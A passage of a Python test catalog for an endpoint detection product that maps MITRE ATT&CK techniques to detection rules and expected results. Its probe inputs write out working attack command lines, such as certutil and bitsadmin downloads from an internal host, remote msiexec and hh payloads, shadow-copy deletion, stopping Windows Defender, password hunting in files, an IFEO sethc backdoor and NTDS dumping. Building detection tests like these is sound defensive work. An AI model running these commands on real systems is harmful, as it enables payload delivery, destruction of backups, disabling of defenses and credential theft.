              "Firefox credential-store paths, catching the file access itself "
              "regardless of how it was launched. HIGH severity with no "
              "corroboration required, because the owning browser processes "
              "are explicitly excluded -- a NON-browser process holding "
              "'Login Data' open has essentially no innocent explanation. "
              "HONEST BOUNDARY: a 5s poll, not a filesystem minifilter, so a "
              "stealer that opens, copies and closes the handle inside one "
              "interval can still be missed; that gap closes only with the "
              "kernel driver (docs/adr/0026).",
    ),
]

# =============================================================================
# DISCOVERY -- a real, confirmed, structural gap (not merely timing)
# =============================================================================
# Shared note for every technique now covered by the reconnaissance-burst
# sequence IOA. Repeated on each entry so no record can be read in isolation
# and mistaken for a standalone-alert claim.
_RECON_BURST_NOTE = (
    "SCORED AS A BURST CONTRIBUTOR, NOT A STANDALONE ALERT. Running this ONE "
    "command alone still raises nothing, deliberately: classify_discovery "
    "labels it at INFO severity and the engine's severity gate drops it. "
    "Discovery is the tactic where alerting on a single command is a "
    "guaranteed false-positive generator (these commands are indistinguishable "
    "from routine administration), so this codebase refuses that trade. What "
    "IS detected is BREADTH: >=3 DISTINCT discovery techniques from the same "
    "process lineage inside 120s completes the 'reconnaissance-burst' sequence "
    "IOA (behavioral_sequences.py, MEDIUM) -- one named incident for the "
    "sweep, not one per command. The Tier A probe replays exactly that: this "
    "technique's real command plus the co-occurring recon commands, through "
    "the real classify_discovery and the real SequenceEngine. Delivery is "
    "realtime_etw because these commands exit in milliseconds -- the 2s poller "
    "loses them, so the burst depends on Sysmon EID 1 / Security 4688, which "
    "etw/sysmon.py now feeds classify_discovery from."
)

DISCOVERY = [
    Technique(
        id="disc-whoami-priv", technique_id="T1033",
        technique_name="System Owner/User Discovery (whoami /priv)",
        tactic="Discovery", art_test_ref="T1033 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: T1033 whoami-priv rule "
                       "(LOW severity) -- and, for the bare form, "
                       "classify_discovery -> 'reconnaissance-burst' IOA",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "whoami.exe", "parent": "cmd.exe",
            "cmdline": "whoami.exe /priv", "path": ""},
        notes="Unlike the other Discovery entries this one has its OWN named "
              "rule (whoami-priv, LOW) because the /priv and /groups flags are "
              "a narrower, more attacker-shaped form than bare `whoami`. It is "
              "scored through that rule. The bare form has no rule and is "
              "instead covered by the reconnaissance-burst sequence. Real-time "
              "delivery via Sysmon EID 1 / 4688 (whoami.exe exits in "
              "single-digit ms, so the 2s poller loses it).",
    ),
    Technique(
        id="disc-systeminfo", technique_id="T1082",
        technique_name="System Information Discovery (systeminfo.exe)",
        tactic="Discovery", art_test_ref="T1082 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py classify_discovery "
                       "(INFO label) -> valkyrie/behavioral_sequences.py "
                       "'reconnaissance-burst' sequence IOA",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "systeminfo.exe", "cmdline": "systeminfo.exe",
            "co_occurring": [("tasklist.exe", "tasklist.exe /v"),
                             ("net.exe", "net view /all")]},
        notes=_RECON_BURST_NOTE,
    ),
    Technique(
        id="disc-tasklist", technique_id="T1057",
        technique_name="Process Discovery (tasklist.exe)",
        tactic="Discovery", art_test_ref="T1057 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py classify_discovery "
                       "(INFO label) -> 'reconnaissance-burst' sequence IOA",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "tasklist.exe", "cmdline": "tasklist.exe /v",
            "co_occurring": [("systeminfo.exe", "systeminfo.exe"),
                             ("whoami.exe", "whoami.exe")]},
        notes=_RECON_BURST_NOTE,
    ),
    Technique(
        id="disc-net-view", technique_id="T1018",
        technique_name="Remote System Discovery (net view)",
        tactic="Discovery", art_test_ref="T1018 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py classify_discovery "
                       "(INFO label) -> 'reconnaissance-burst' sequence IOA",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "net.exe", "cmdline": "net view /all",
            "co_occurring": [("systeminfo.exe", "systeminfo.exe"),
                             ("tasklist.exe", "tasklist.exe /v")]},
        notes=_RECON_BURST_NOTE,
    ),
    Technique(
        id="disc-local-accounts", technique_id="T1087.001",
        technique_name="Account Discovery: Local Account (net user)",
        tactic="Discovery", art_test_ref="T1087.001 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py classify_discovery "
                       "(INFO label, and ONLY for the non-mutating form -- "
                       "'net user ... /add' is account CREATION and belongs to "
                       "the T1136.001 rule) -> 'reconnaissance-burst' IOA",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "net.exe", "cmdline": "net user",
            "co_occurring": [("systeminfo.exe", "systeminfo.exe"),
                             ("tasklist.exe", "tasklist.exe /v")]},
        notes="FOUND AND FIXED during this evaluation, not merely predicted: "
              "the FIRST Tier A run showed this bare discovery command "
              "incorrectly firing the T1136.001 'Create Local Account' rule -- "
              "net-user-add matched the substring 'net user' with no /add "
              "required, so listing accounts and creating a backdoor account "
              "were indistinguishable. Fixed in behavioral_rules.py (now "
              "cmd_all=('net user','/add')). It was then scored MISS because "
              "no T1087.001 path existed at all. AS OF 2026-08-04 it has one: "
              "classify_discovery labels the non-mutating form and the "
              "reconnaissance-burst sequence detects the sweep it belongs to. "
              + _RECON_BURST_NOTE,
    ),
    Technique(
        id="disc-domain-trust", technique_id="T1482",
        technique_name="Domain Trust Discovery (nltest)",
        tactic="Discovery", art_test_ref="T1482 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: T1482 rule EXISTS "
                       "(the one discovery technique with a named rule)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "nltest.exe", "parent": "cmd.exe",
            "cmdline": "nltest.exe /domain_trusts /all_trusts", "path": ""},
        notes="Rule exists, unlike the other Discovery entries. Real-time "
              "delivery via Sysmon EID 1 / Security 4688 (the EID 1 "
              "classifier-stack fix), so the poller race no longer decides "
              "this one. Requires a domain-joined host to test authentically.",
    ),
]

# =============================================================================
# LATERAL MOVEMENT -- structurally hard to test with one VM; said honestly
# =============================================================================
LATERAL_MOVEMENT = [
    Technique(
        id="lat-psexec-smb", technique_id="T1021.002",
        technique_name="Remote Services: SMB/Windows Admin Shares (PsExec)",
        tactic="Lateral Movement", art_test_ref="T1021.002 Test #1 (self-target)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: psexec-service-host rule "
                       "(inbound/receiving end); psexec-remote covers the "
                       "operator's outbound command",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "psexesvc.exe", "parent": "services.exe",
            "cmdline": r"C:\Windows\PSEXESVC.exe", "path": ""},
        notes="REAL COVERAGE GAP, FOUND BY THIS EVALUATION AND FIXED 2026-08-04. "
              "The pre-existing psexec-remote rule matches the OPERATOR'S "
              "outbound command ('psexec \\\\target ...') -- which only helps "
              "on the machine the attacker already controls. This atomic "
              "replays PSEXESVC.exe, the service binary PsExec drops and starts "
              "on the TARGET, and nothing matched it. New psexec-service-host "
              "rule matches on image name alone (psexesvc/paexec/remcomsvc/"
              "csexecsvc), needing no command line, so it detects lateral "
              "movement arriving INTO this host -- the more useful half for a "
              "defender. PARTIAL FIDELITY ON ONE VM still applies: a "
              "self-target run proves the service signature is recognised, NOT "
              "that cross-host movement is detected. That needs a 2-VM "
              "topology and is a test-infrastructure limit, not a code gap.",
    ),
    Technique(
        id="lat-wmi-remote", technique_id="T1047",
        technique_name="Windows Management Instrumentation (remote node)",
        tactic="Lateral Movement",
        art_test_ref="T1047 Test #3 (wmic /node: remote, self-target)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: wmic-remote-node rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "wmic.exe", "parent": "cmd.exe",
            "cmdline": 'wmic.exe /node:"target" process call create "calc.exe"',
            "path": ""},
        notes="SAME single-VM caveat as above. wmic exits immediately -> MISS.",
    ),
    Technique(
        id="lat-tool-transfer", technique_id="T1570",
        technique_name="Lateral Tool Transfer",
        tactic="Lateral Movement",
        art_test_ref="T1570 (copy via admin share, self-target)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: lateral-tool-transfer "
                       "rule (MEDIUM)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "cmd.exe", "parent": "explorer.exe",
            "cmdline": r"copy C:\tool.exe \\target\C$\Windows\Temp\tool.exe",
            "path": ""},
        notes="Rule ADDED 2026-08-04 (was a genuine coverage hole). Requires "
              "a UNC path AND a well-known ADMINISTRATIVE share (C$/D$/ADMIN$/"
              "IPC$) -- a UNC copy to an ordinary file-server share does not "
              "match, which is the FP boundary (routine IT admin work copies "
              "to admin shares too, hence MEDIUM not HIGH). SAME single-VM "
              "caveat as the other Lateral Movement entries: a self-target "
              "run proves the command shape is recognised, NOT that cross-host "
              "movement is detected -- that needs a 2-VM topology.",
    ),
]

# =============================================================================
# COMMAND AND CONTROL -- Valkyrie's strongest tactic, and it shows
# =============================================================================
COMMAND_AND_CONTROL = [
    Technique(
        id="c2-dns-tracker-domain", technique_id="T1071.004",
        technique_name="Application Layer Protocol: DNS (query to a known tracker)",
        tactic="Command and Control",
        art_test_ref="Custom -- DNS resolution to an EasyPrivacy-listed domain",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_INLINE,
        detector_path="valkyrie/dns_interceptor.py:_decide -> "
                       "site_scanner / blocklist (curated list, NOT a "
                       "user-defined rule -- see scoring note)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="dns", probe_input={"domain": "doubleclick.net",
                                  "process": "chrome.exe"},
        notes="SCORING NOTE: this fires via Valkyrie's own curated blocklist, "
              "which is NOT the same as a user-authored always_block rule "
              "(category='user_rule'). Per the evaluation's explicit rule, "
              "only user_rule-category hits are excluded from the behavioral "
              "count; a match against Valkyrie's own automated blocklist "
              "counts as a real (if list-based, not learned) detection, and "
              "is labeled as such rather than folded into 'behavioral'.",
    ),
    Technique(
        id="c2-dga-domain", technique_id="T1071.004",
        technique_name="Application Layer Protocol: DNS (DGA-generated domain)",
        tactic="Command and Control",
        art_test_ref="Custom -- algorithmically-generated C2 domain",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_INLINE,
        detector_path="valkyrie/dga.py:classify_dga -> dns_interceptor pipeline",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="dga", probe_input={"domain": "xk4j9zq2plyw7vbn.info"},
        notes="Genuine behavioral/statistical detection -- not list-based.",
    ),
    Technique(
        id="c2-hardcoded-ip", technique_id="T1071",
        technique_name="Hardcoded-IP C2 (no DNS lookup at all)",
        tactic="Command and Control",
        art_test_ref="Custom -- raw connect() to a threat-intel-flagged IP",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_INLINE,
        detector_path="valkyrie/network_telemetry.py:classify_connection "
                       "-- explicitly designed for exactly this case",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="network", probe_input={"ip": "45.9.148.99", "port": 443,
                                      "blocked": True},
        notes="This is the case DNS-only detection structurally cannot see. "
              "Its own docstring says so.",
    ),
    Technique(
        id="c2-dns-tunneling", technique_id="T1071.004",
        technique_name="DNS Tunneling / high-volume subdomain queries",
        tactic="Command and Control",
        art_test_ref="Custom -- iodine/dnscat2-style query flood",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_INLINE,
        detector_path="valkyrie/dns_tunnel.py:SubdomainFloodDetector",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="dns_tunnel", probe_input={
            "base": "tunnel.example.com", "n_labels": 40},
        notes="",
    ),
    Technique(
        id="c2-ingress-tool-transfer", technique_id="T1105",
        technique_name="Ingress Tool Transfer (certutil -urlcache download)",
        tactic="Command and Control", art_test_ref="T1105 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: certutil-download rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "certutil.exe", "parent": "cmd.exe",
            "cmdline": "certutil.exe -urlcache -split -f "
                       "http://10.0.0.5/tool.exe tool.exe", "path": ""},
        notes="Same process-poll race as the other LOLBin rules -- BUT this "
              "same download almost always ALSO produces an outbound "
              "connection/DNS lookup to the hosting domain, which the C2 "
              "path (DNS/network, inline, reliable) may independently catch. "
              "Scored on the process-side rule alone since that is what this "
              "entry targets; the DNS-side catch is credited separately if "
              "the hosting domain is itself flagged.",
    ),
]

# =============================================================================
# IMPACT -- Valkyrie's most purpose-built defense, and a real gap alongside it
# =============================================================================
IMPACT = [
    Technique(
        id="impact-ransomware-encrypt", technique_id="T1486",
        technique_name="Data Encrypted for Impact (canary-directory encryption)",
        tactic="Impact", art_test_ref="Custom -- rapid high-entropy overwrite "
                                      "of canary files (ransomware simulation)",
        destructive=True, live_vm_safe=True,
        delivery=DELIVERY_PURPOSE_BUILT,
        detector_path="valkyrie/ransomware_shield.py (canary tripwires + "
                       "entropy watcher) + behavioral_sequences.py "
                       "'ransomware' ESP sequence",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ransomware", probe_input={"payload": "random_high_entropy"},
        notes="Valkyrie's most mature, purpose-built detector. Genuinely "
              "expected to be strong here -- this is the one place a "
              "confident DETECT is warranted, not merely hoped for.\n"
              "REAL LIVE MISS FOUND 2026-08-27, TRACED TO A HARNESS BUG, NOT "
              "A DETECTOR GAP: the live run scored attack_executed=true, "
              "classifier_logic_fires=false. Root cause: the probe called "
              "/api/ransomware/self-test, which invokes ransomware_shield."
              "py's simulate() - a function whose own docstring says it "
              "builds an ISOLATED, throwaway CanaryManager in a temp dir, "
              "'used by the /api self-test AND UNIT TESTS'. It is a unit "
              "test wearing an API route: it never touches the real, "
              "running shield's own watched canaries and publishes no "
              "TelemetryEvent, so it could never produce a scoreable "
              "incident regardless of how good the real detector is. Fixed "
              "in run_live_evaluation.ps1: the probe now reads the REAL "
              "armed shield's own manifest (data/ransomware_canaries.json, "
              "written by CanaryManager._save_manifest() at real startup) "
              "and overwrites an ACTUAL live-armed canary with random "
              "high-entropy bytes, then polls for a real incident exactly "
              "like every other technique. Not yet re-verified live at the "
              "time of this note - see docs/LIVE_FIRE_EVALUATION.md for the "
              "re-verification result.",
    ),
    Technique(
        id="impact-shadow-delete", technique_id="T1490",
        technique_name="Inhibit System Recovery (vssadmin delete shadows)",
        tactic="Impact", art_test_ref="T1490 Test #1",
        destructive=True, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: vssadmin-delete rule "
                       "(CRITICAL severity)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "vssadmin.exe", "parent": "cmd.exe",
            "cmdline": "vssadmin.exe delete shadows /all /quiet", "path": ""},
        notes="Short-lived native command, same wiring gap. Notable because "
              "this is a CRITICAL-severity rule that, if this atomic runs "
              "standalone (not chained after a ransomware encryption phase "
              "the canary already caught), is likely to go completely unseen.",
    ),
    Technique(
        id="impact-service-stop", technique_id="T1489",
        technique_name="Service Stop (targeting a security-relevant service)",
        tactic="Impact",
        art_test_ref="T1489 Test #1 -- IMPORTANT: in any LIVE run, stop a "
                     "throwaway service RENAMED into the watched set (e.g. a "
                     "dummy service named 'Sysmon64'), never the real "
                     "WinDefend/EventLog and never Valkyrie's own service",
        destructive=True, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: service-stop-security / "
                       "service-disable-security rules (HIGH)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "sc.exe", "parent": "cmd.exe",
            "cmdline": "sc.exe stop WinDefend", "path": ""},
        notes="Rules ADDED 2026-08-04 (was a genuine coverage hole). Two "
              "rules, since 'stop' (sc/net/Stop-Service) and 'disabled' (sc "
              "config / Set-Service -StartupType Disabled) are different "
              "command shapes; each requires BOTH the verb AND a "
              "security-relevant service name, so 'sc stop Spooler' and 'sc "
              "query WinDefend' both stay clear (regression controls in "
              "tests/test_behavioral_rules.py). NOTE the Tier B test-ref "
              "change: the probe now uses a REAL watched service name because "
              "the rule keys on that name -- so a live run must rename a "
              "DECOY service into the watched set rather than stopping a "
              "service called 'DecoySecurityService', which by design matches "
              "nothing. root_cause.py additionally proposes an artifact-at-"
              "rest Win32_Service state check; that remains unbuilt and would "
              "add poller-independent coverage for service stops performed "
              "WITHOUT a command line (e.g. via the Services MMC or an API "
              "call), which these command-shape rules cannot see.",
    ),
]

# =============================================================================
# OUT OF SCOPE -- named and reasoned, not silently dropped
# =============================================================================
OUT_OF_SCOPE = [
    Technique(
        id="oos-ntds-dump", technique_id="T1003.003",
        technique_name="OS Credential Dumping: NTDS.dit",
        tactic="Credential Access", art_test_ref="T1003.003",
        destructive=True, live_vm_safe=False,
        out_of_scope_reason="Requires a Domain Controller. A single "
            "standalone-workstation VM cannot host this test at all, let "
            "alone safely.",
        predicted_tier_b="N/A",
    ),
    Technique(
        id="oos-data-destruction", technique_id="T1485",
        technique_name="Data Destruction (recursive file deletion)",
        tactic="Impact", art_test_ref="T1485",
        destructive=True, live_vm_safe=False,
        out_of_scope_reason="Genuinely destructive with a real blast-radius "
            "risk even inside a VM if the target path is misconfigured. "
            "Excluded from the automated catalog; if run at all, do it "
            "manually against a throwaway directory, never via the batch "
            "runner.",
        predicted_tier_b="N/A",
    ),
    Technique(
        id="oos-account-lockout", technique_id="T1531",
        technique_name="Account Access Removal",
        tactic="Impact", art_test_ref="T1531",
        destructive=True, live_vm_safe=False,
        out_of_scope_reason="Can lock the VM's own operator out of the "
            "session it needs to read results from. Excluded.",
        predicted_tier_b="N/A",
    ),
    Technique(
        id="oos-inhibit-recovery-bcdedit", technique_id="T1490",
        technique_name="Inhibit System Recovery (bcdedit boot config tampering)",
        tactic="Impact", art_test_ref="T1490 Test #4",
        destructive=True, live_vm_safe=False,
        out_of_scope_reason="Can break the VM's ability to boot at all, "
            "which defeats snapshot-revert if the snapshot was taken after "
            "boot config was already live-modified. The vssadmin variant "
            "above covers this technique's detection surface far more safely.",
        predicted_tier_b="N/A",
    ),
]

# =============================================================================
# EXTENDED (added 2026-08-20)
# =============================================================================
# Valkyrie already had behavioral rules for these MITRE techniques, but the
# catalog was not TESTING them. Each command line below was verified to fire via
# match_process before being added (an honest DETECT, not a guess), and every
# tool used (bitsadmin / findstr / attrib / netsh) ships on the standard Windows
# runner, so a live run actually exercises it. This is how the red-team surface
# grows: not re-running the same 40, but validating rules that were never tested.
EXTENDED = [
    Technique(
        id="evasion-bits-transfer", technique_id="T1197",
        technique_name="BITS Jobs (bitsadmin transfer)",
        tactic="Defense Evasion", art_test_ref="T1197 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: bitsadmin-transfer rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "bitsadmin.exe", "parent": "cmd.exe",
            "cmdline": r"bitsadmin.exe /transfer job http://10.0.0.5/t.exe "
                       r"C:\Users\Public\t.exe", "path": ""},
        notes="Verified via match_process (labels bitsadmin_transfer, "
              "download_cradle). bitsadmin ships on Windows.",
    ),
    Technique(
        id="cred-files-hunt", technique_id="T1552.001",
        technique_name="Unsecured Credentials: Credentials In Files (findstr)",
        tactic="Credential Access", art_test_ref="T1552.001 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: cred-hunt rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "findstr.exe", "parent": "cmd.exe",
            "cmdline": r"findstr /si password *.txt *.xml *.ini", "path": ""},
        notes="Verified via match_process (cred_hunt). findstr ships on Windows.",
    ),
    Technique(
        id="evasion-hidden-file", technique_id="T1564.001",
        technique_name="Hide Artifacts: Hidden Files and Directories (attrib +h +s)",
        tactic="Defense Evasion", art_test_ref="T1564.001 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: hide-file rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "attrib.exe", "parent": "cmd.exe",
            "cmdline": r"attrib.exe +h +s C:\Users\Public\evil.exe", "path": ""},
        notes="Verified via match_process (hide_file). attrib ships on Windows.",
    ),
    Technique(
        id="c2-port-forward", technique_id="T1090",
        technique_name="Proxy (netsh portproxy)",
        tactic="Command and Control", art_test_ref="T1090 (netsh portproxy)",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: port-forward rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "netsh.exe", "parent": "cmd.exe",
            "cmdline": "netsh.exe interface portproxy add v4tov4 listenport=8080 "
                       "connectaddress=10.0.0.5 connectport=4444", "path": ""},
        notes="Verified via match_process (port_forward). netsh ships on Windows.",
    ),
]

# ---------------------------------------------------------------------------
# Breadth expansion (2026-08-24) - a DIFFERENT ~13-technique set to probe
# coverage across tactics the catalog had not exercised, including two entirely
# new tactics (Privilege Escalation, Collection). Every predicted_tier_b here
# was set by running the real classify_behavior against the exact command below
# (SOURCE_CONFIRMED), NOT guessed - so the honest DETECT/MISS split is a real
# breadth measurement, not a flattering one. The MISS entries (fodhelper UAC,
# net localgroup, wscript VBS, rar archive, local data copy) are kept in
# deliberately: an honest breadth test names what is NOT covered.
BREADTH_EXPANSION = [
    Technique(
        id="evasion-msiexec-remote", technique_id="T1218.007",
        technique_name="System Binary Proxy: Msiexec (remote MSI)",
        tactic="Defense Evasion", art_test_ref="T1218.007 (documented cmdline)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: msiexec proxy rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "msiexec.exe", "parent": "cmd.exe",
            "cmdline": r"msiexec.exe /q /i http://10.0.0.5/evil.msi", "path": ""},
        notes="Remote MSI install via msiexec is a classic LOLBin proxy exec. "
              "Fires classify_behavior -> T1218.007. Remote host is unroutable, "
              "so the install fails harmlessly; the process (EID 1) is the signal.",
    ),
    Technique(
        id="evasion-cmstp-inf", technique_id="T1218.003",
        technique_name="System Binary Proxy: CMSTP",
        tactic="Defense Evasion", art_test_ref="T1218.003 (documented cmdline)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: cmstp rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "cmstp.exe", "parent": "cmd.exe",
            "cmdline": r"cmstp.exe /ni /s C:\Users\Public\evil.inf", "path": ""},
        notes="cmstp /s executes a (malicious) INF; verified -> T1218.003. INF "
              "absent, so it fails; the proxy-exec attempt is the detection.",
    ),
    Technique(
        id="evasion-hh-chm", technique_id="T1218.001",
        technique_name="System Binary Proxy: Compiled HTML File (hh.exe)",
        tactic="Defense Evasion", art_test_ref="T1218.001 (documented cmdline)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: hh.exe / chm rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "hh.exe", "parent": "cmd.exe",
            "cmdline": r"hh.exe http://10.0.0.5/evil.chm", "path": ""},
        notes="hh.exe fetching a remote CHM is a known proxy-exec; verified -> "
              "T1218.001.",
    ),
    Technique(
        id="evasion-wmic-xsl", technique_id="T1220",
        technique_name="XSL Script Processing (wmic /format)",
        tactic="Defense Evasion", art_test_ref="T1220 (documented cmdline)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: wmic XSL rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "wmic.exe", "parent": "cmd.exe",
            "cmdline": r'wmic process list /format:"http://10.0.0.5/evil.xsl"',
            "path": ""},
        notes="wmic /format with a remote XSL runs attacker script; verified -> "
              "T1220.",
    ),
    Technique(
        id="evasion-syncappv", technique_id="T1216",
        technique_name="System Script Proxy: SyncAppvPublishingServer",
        tactic="Defense Evasion", art_test_ref="T1216 (documented cmdline)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: SyncAppvPublishingServer rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "SyncAppvPublishingServer.exe", "parent": "cmd.exe",
            "cmdline": r'SyncAppvPublishingServer.exe "n; Start-Process calc"',
            "path": ""},
        notes="Signed-binary script proxy; verified -> T1216. Payload just "
              "launches calc.",
    ),
    Technique(
        id="exec-msbuild-inline", technique_id="T1127.001",
        technique_name="Trusted Developer Utilities: MSBuild",
        tactic="Execution", art_test_ref="T1127.001 (documented cmdline)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: MSBuild rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "msbuild.exe", "parent": "cmd.exe",
            "cmdline": r"msbuild.exe C:\Users\Public\evil.csproj", "path": ""},
        notes="MSBuild running an inline-task project compiles+runs C# at build "
              "time; verified -> T1127.001 offline. TOOL ABSENT ON A CLEAN HOST: "
              "msbuild.exe ships with Visual Studio / the .NET SDK, NOT with "
              "Windows (verified 2026-08-25: `Get-Command msbuild.exe` fails on a "
              "stock Windows box and on the CI runner). So a live MISS here is a "
              "tool-failure, not a detection gap - the process never starts, so "
              "there is nothing for any EDR to see. Scored as NOT_TESTED, not "
              "missed, and excluded from the honest denominator.",
    ),
    Technique(
        id="cred-ntdsutil-ifm", technique_id="T1003.003",
        technique_name="OS Credential Dumping: NTDS (ntdsutil IFM)",
        tactic="Credential Access", art_test_ref="T1003.003 (documented cmdline)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: ntdsutil rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "ntdsutil.exe", "parent": "cmd.exe",
            "cmdline": r"ntdsutil.exe ac i ntds ifm create full C:\temp q q",
            "path": ""},
        notes="ntdsutil IFM dumps the AD database; verified -> T1003.003 offline. "
              "TOOL ABSENT ON A NON-DC: ntdsutil.exe ships with the AD DS role, "
              "not with stock Windows (verified 2026-08-25: `Get-Command "
              "ntdsutil.exe` fails on a stock box and on the CI runner). A live "
              "MISS is therefore a tool-failure, not a detection gap - no process "
              "starts, so nothing is observable. Scored NOT_TESTED, excluded from "
              "the honest denominator. Testing this properly needs a DC.",
    ),
    Technique(
        id="persist-ifeo-debugger", technique_id="T1546.012",
        technique_name="Event Triggered Execution: IFEO Debugger",
        tactic="Persistence", art_test_ref="T1546.012 (documented cmdline)",
        destructive=True, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: IFEO debugger rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "reg.exe", "parent": "cmd.exe",
            "cmdline": r'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d cmd.exe /f',
            "path": ""},
        notes="Sets a Debugger on sethc.exe (accessibility) via IFEO - a real "
              "persistence + privesc change, so destructive=True (revert after). "
              "Verified -> T1546.012.",
    ),
    Technique(
        id="privesc-uac-mssettings", technique_id="T1548.002",
        technique_name="Abuse Elevation Control: Bypass UAC (ms-settings hijack)",
        tactic="Privilege Escalation", art_test_ref="T1548.002 (documented cmdline)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: UAC ms-settings hijack rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "reg.exe", "parent": "cmd.exe",
